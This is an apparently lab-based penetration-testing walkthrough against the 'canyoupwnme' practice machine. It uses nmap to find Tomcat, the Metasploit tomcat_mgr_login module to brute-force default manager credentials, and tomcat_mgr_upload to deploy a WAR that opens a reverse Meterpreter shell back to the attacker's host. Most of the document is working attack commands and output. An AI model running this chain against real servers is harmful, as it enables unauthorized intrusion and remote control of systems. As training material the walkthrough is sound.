# Tomcat

Goal of this attack is to deploy a reverse shell on the target machine.

## Port scanning to identify Tomcat

Let's scan the target machine (`canyoupwnme`) with `nmap`

    $ nmap -A -T4 -sT -p1-65535 canyoupwnme
    ...
    8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1
    | http-methods:
    |   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
    |_  Potentially risky methods: PUT DELETE
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache-Coyote/1.1
    |_http-title: Apache Tomcat
    ...

## Check what is available

With your browser, open the URL

    http://canyoupwnme:8080/manager

Seems that the Tomcat's management console is available, but authentication is
needed. Metsasploit can help us...

## Brute forcing the Tomcat's management console

    msf > use auxiliary/scanner/http/tomcat_mgr_login
    msf auxiliary(tomcat_mgr_login) > set rhosts canyoupwnme
    msf auxiliary(tomcat_mgr_login) > set rport 8080
    msf auxiliary(tomcat_mgr_login) > exploit

    [!] No active DB -- Credential data will not be saved!
    [-] 10.0.100.195:8080 TOMCAT_MGR - LOGIN FAILED: admin:admin (Incorrect: )
    [-] 10.0.100.195:8080 TOMCAT_MGR - LOGIN FAILED: admin:manager (Incorrect: )
    ...)
    [+] 10.0.100.195:8080 - LOGIN SUCCESSFUL: tomcat:tomcat
        ...
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf auxiliary(tomcat_mgr_login) > quit

Yep! Credentials `tomcat:tomcat` were found. Still using Metasploit, we can
upload a crafted `.WAR` in order to have a reverse TCP shell enabled.

## Injecting a reverse shell

    msf > use exploit/multi/http/tomcat_mgr_upload
    msf exploit(tomcat_mgr_upload) > set username tomcat
    msf exploit(tomcat_mgr_upload) > set password tomcat
    msf exploit(tomcat_mgr_upload) > set rhost canyoupwnme
    msf exploit(tomcat_mgr_upload) > set rport 8080
    msf exploit(tomcat_mgr_upload) > exploit

    [*] Started reverse TCP handler on 10.0.100.245:4444
    [*] canyoupwnme:8080 - Retrieving session ID and CSRF token...
    [*] canyoupwnme:8080 - Uploading and deploying Hv5hJD7sAuzbRX3UGWiOctD6yz3j...
    [*] canyoupwnme:8080 - Executing Hv5hJD7sAuzbRX3UGWiOctD6yz3j...
    [*] canyoupwnme:8080 - Undeploying Hv5hJD7sAuzbRX3UGWiOctD6yz3j ...
    [*] Sending stage (45741 bytes) to 10.0.100.195
    [*] Meterpreter session 1 opened (10.0.100.245:4444 -> 10.0.100.195:52043) at 2016-04-18 13:33:40 +0200

    meterpreter > shell
    Process 1 created.
    Channel 1 created.
    id
    uid=106(tomcat7) gid=114(tomcat7) groups=114(tomcat7)

Got it!
